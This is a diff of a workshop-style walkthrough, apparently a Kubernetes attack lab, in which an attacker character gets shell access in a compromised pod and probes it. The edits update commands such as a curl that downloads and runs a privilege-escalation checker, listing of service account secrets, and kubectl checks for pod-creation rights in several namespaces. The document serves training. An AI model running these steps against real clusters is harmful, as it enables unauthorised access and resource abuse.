@@ -26,7 +26,7 @@ In the real world, use good judgment. Don't hurt people, don't get yourself in t
 __Red__ has been mining `bitcoinero` for a few months now, and it's starting to gain some value.  To capitalize on this bubble, __Red__ uses a service that sells shell access to expand the mining pool.  To find the compromised website, run the following from your Cloud Shell terminal:
 
 ```console
-./check-email.sh
+./attack-1-helper.sh
 ```
 
 Log into the URL in a browser, and you should be looking at a working web terminal.
@@ -100,7 +100,7 @@ ls -l /home
 ls -l /root
 ```
 ```console
-cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
+cd /tmp; curl https://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard
 ```
 
 That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container:
@@ -113,16 +113,13 @@ This tells us several things:
 
 * We are in a container, and it's managed by Kubernetes
 * Some security features are not in use (userns)
-* The host seems to be running the default Docker seccomp profile, restricting some key kernel calls
+* Seccomp is disabled, but a number of Syscalls are blocked
 * We don't have any exciting capabilities. <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">Click for more capabilities info.</a>
 
 Now let's inspect our Kubernetes environment:
 
 ```console
 env | grep -i kube
-```
-```console
-curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
 ```
 ```console
 ls /var/run/secrets/kubernetes.io/serviceaccount
@@ -132,7 +129,7 @@ We have typical Kubernetes-related environment variables defined, and we have an
 
 ```console
 export PATH=/tmp:$PATH
-cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
+cd /tmp; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
 ```
 ```console
 kubectl get all
@@ -152,10 +149,13 @@ Let's inspect what all we __can__ do:
 kubectl auth can-i --list
 ```
 
-Can we create pods in this namespace?
+Can we create pods in this and other namespaces?
 
 ```console
 kubectl auth can-i create pods
+kubectl auth can-i create pods -n dev
+kubectl auth can-i create pods -n prd
+kubectl auth can-i create pods -n kube-system
 ```
 
 Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals.
